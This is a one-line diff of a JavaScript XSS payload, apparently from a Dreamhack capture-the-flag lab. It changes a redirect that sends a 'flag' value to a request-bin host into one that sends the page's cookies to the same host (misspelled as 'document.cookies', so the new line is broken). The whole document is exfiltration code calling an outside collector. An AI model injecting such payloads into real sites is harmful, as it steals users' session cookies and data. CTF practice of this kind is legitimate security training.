@@ -1,1 +1,1 @@
-location.href ='https://leqwtlp.request.dreamhack.games/get?flag='+flag
+location.href ='https://leqwtlp.request.dreamhack.games/'+document.cookies
